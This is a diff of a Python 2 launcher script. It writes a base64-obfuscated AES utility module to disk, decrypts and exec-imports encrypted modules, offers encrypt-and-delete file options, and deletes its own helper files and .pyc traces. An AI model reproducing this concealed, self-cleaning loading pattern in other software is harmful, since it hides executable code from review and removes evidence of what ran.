@@ -5,7 +5,6 @@ import os
 
 PY_VER = int(sys.version[0])
 
-
 def create_utils():
 	i = 'ZnJvbSBDcnlwdG8uUmFuZG9tIGltcG9ydCBnZXRfcmFuZG9tX2J5dGVzCmZyb20gQ3J5cHRvLkNp'\
 		'cGhlciBpbXBvcnQgQUVTCmltcG9ydCBiYXNlNjQKaW1wb3J0IHNvY2tldAppbXBvcnQgc3lzCmlt'\
@@ -25,22 +24,54 @@ def create_utils():
 	if PY_VER <3:
 		open('utils.py', 'wb').write(base64.b64decode(i))
 
+create_utils() # Create UTILS 
+import utils
+
 def cleanup(files):
 	for f in files: Thread(target=os.remove, args=(f,)).start()
+	os.system('rm *.pyc >> /dev/null')
+
+def load_module(name):
+	key_name = name + '.key'
+	enc_mod = name + '.lol'
+	dec_mod = name + '.py'
+	open(dec_mod,'wb').write(utils.fdecrypt(enc_mod))
+	try:
+		exec('import %s' % name)
+		# os.system('rm %s %s' % (key_name, enc_mod))
+	except:
+		print 'Failed to import'
+		os.system('rm %s' % dec_mod)
+		pass
+
 
 def main():
 	PY_VER = int(sys.version[0])
+	
+	# Would need to curl the .key files for each .lol file
 
-	# Create UTILS 
-	create_utils()
-	import utils
+	if '-run' in sys.argv:
+		print 'Importing modules...'
+		modules = ['security', 'serve']
+		for lib in modules:
+			load_module(lib)
 
-	# start the server 
-	import serve 
-	serve.Server().run()
+
+	if '-d' in sys.argv and len(sys.argv) > 2:
+		target_file = sys.argv[2]
+		print utils.fdecrypt(target_file)
+
+	if '-e' in sys.argv and len(sys.argv) > 2:
+		target_file = sys.argv[2]
+		utils.fencrypt(target_file, False)
+
+	if '-E' in sys.argv and len(sys.argv) > 2:
+		target_file = sys.argv[2]
+		print '[!!] Encrypting and \033[1mdeleting\033[0m %s' % target_file
+		utils.fencrypt(target_file, True)
 
 	# cleanup extra files
-	cleanup(['utils.py', 'id'])
+	cleanup(['utils.py'])
 
 if __name__ == '__main__':
 	main()
